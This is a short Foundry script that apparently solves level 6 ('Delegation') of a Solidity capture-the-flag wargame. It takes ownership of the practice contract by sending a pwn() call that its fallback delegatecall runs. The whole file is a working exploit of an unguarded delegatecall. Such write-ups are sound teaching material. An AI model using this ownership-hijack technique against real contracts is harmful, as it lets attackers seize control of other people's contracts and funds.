// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel06.sol";

contract POC is Script {
    Delegation level6 = Delegation(0x8975258B8d1cFC32015D32C9C3201dc56947cd70);

    function run() external {
        vm.startBroadcast();

        console.log("Current owner is : ", level6.owner()); // checking current owner
        (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()")); // triggering callback with my msg.data
        console.log("Checking delegatecall result : ", success); // checking result for delegatecall
        console.log("New owner is : ", level6.owner()); // confirming new owner

        vm.stopBroadcast();
    }
}

